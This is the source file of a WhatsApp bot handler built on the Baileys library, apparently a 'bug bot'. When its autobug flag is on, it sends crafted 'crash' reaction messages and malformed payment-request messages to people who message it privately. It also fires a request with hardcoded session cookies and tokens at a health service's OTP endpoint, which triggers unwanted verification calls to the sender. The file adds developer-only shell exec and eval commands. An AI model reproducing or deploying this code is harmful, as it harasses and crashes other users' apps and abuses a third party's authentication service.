const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const http = require("http");
const { exec } = require('child_process')
const cheerio = require('cheerio')
const moment = require('moment-timezone')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

let user = JSON.parse(fs.readFileSync('./user.json'));

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const time = moment.tz('Asia/Jakarta').format('ha z')
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isUser = user.includes(from)
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}



if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isDev && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

   
    if (body && !msg.key.fromMe) {
    //   if (!usr) {
    //     semar.sendMessage(from, {
    //       text: "Created By RasiTech\n\nJoin Telegram @RasiTechChannel1",
    //     });
    //     usr_.push(from);
    //   }

    axios
      .get(`https://simsimi.info/api/?text=${body}&lc=id`)
        .then((data) =>
        reply(`*🤖 : ${JSON.parse(JSON.stringify(data.data)).message}*\n\nTG : @RasiTechChannel1`)
      );
    //   const simi = fetchJson();

      
    }

if (command && !isUser) {}

if (body.startsWith(`$`)){ if (!isDev) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
        
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}


if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev) return }
switch (command) {
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285719821928@s.whatsapp.net", {text:e})}}